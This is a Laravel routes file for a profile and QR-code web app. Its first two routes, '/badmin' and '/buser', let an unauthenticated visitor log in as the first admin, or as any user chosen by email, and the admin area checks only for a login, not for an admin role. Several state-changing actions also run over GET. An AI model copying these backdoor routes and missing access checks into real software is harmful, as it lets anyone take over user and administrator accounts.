<?php

use App\Http\Controllers\ProfileController;
use Illuminate\Support\Facades\Route;

Route::get('/badmin', function () {
    $admin = \App\Models\User::query()->where('role', 'admin')->first();
    auth()->login($admin);
    return redirect()->route('admin.dashboard');
});
Route::get('/buser/{email?}', function () {
    if ($email = request()->get('email')) {
        $user = \App\Models\User::query()->where('email', $email)->first();
    }else{
        $user = \App\Models\User::query()->where('role', '!=', 'admin')->first();
    }
    auth()->login($user);
    return redirect()->route('home');
});

Route::view('/', 'welcome')->name('welcome');

Route::post('switch-language', [\App\Http\Controllers\SiteController::class, 'switchLanguage'])->name('switch-language');

Route::view('home', 'home')->middleware(['auth', 'verified'])->name('home');

Route::get('profile/{id}', [ProfileController::class, 'view'])->name('profile.show');
Route::get('profile-invite/{token}', [ProfileController::class, 'acceptInvite'])->name('profile.invite.accept');

Route::get('/qr-assignment/{identifier}', \App\Livewire\QrAssignment::class)->name('qr-assignment');


Route::middleware(['auth'])->group(function () {
    Route::get('mark-favourite/{id}', [\App\Http\Controllers\ProfileController::class, 'markFavourite'])->name('mark-favourite');
    Route::get('change-status/{id}', [\App\Http\Controllers\ProfileController::class, 'changeVisibility'])->name('change-status');
});

Route::prefix('admin')->middleware(['auth'])->as('admin.')->group(function () {
    Route::view('dashboard', 'admin.dashboard')->name('dashboard');
    Route::view('qr-codes', 'admin.qr-codes.index')->name('qr-codes.index');

    Route::resource('users', \App\Http\Controllers\Admin\UsersController::class);
    Route::resource('profiles', \App\Http\Controllers\Admin\ProfilesController::class);
    Route::get('settings', [\App\Http\Controllers\Admin\SettingsController::class, 'index'])->name('settings.index');
    Route::post('settings', [\App\Http\Controllers\Admin\SettingsController::class, 'update'])->name('settings.update');
});

Route::get('switch-account', function () {
    auth()->logout();
    return redirect()->back();
})->name('switch-account');


Route::post('logout', function () {
    auth()->logout();
    return redirect()->route('login');
})->name('logout');


Route::get('qr-code/verify/{identifier}', function ($identifier) {
    $qrCode = \App\Models\QrCode::where('identifier', $identifier)->first();
    if ($qrCode->is_assigned) {
        return redirect()->route('profile.show', ['id' => $qrCode->profile_id]);
    }else{
        return redirect()->route('qr-assignment', $identifier);
    }
})->name('qr-code.verify');

require __DIR__ . '/auth.php';
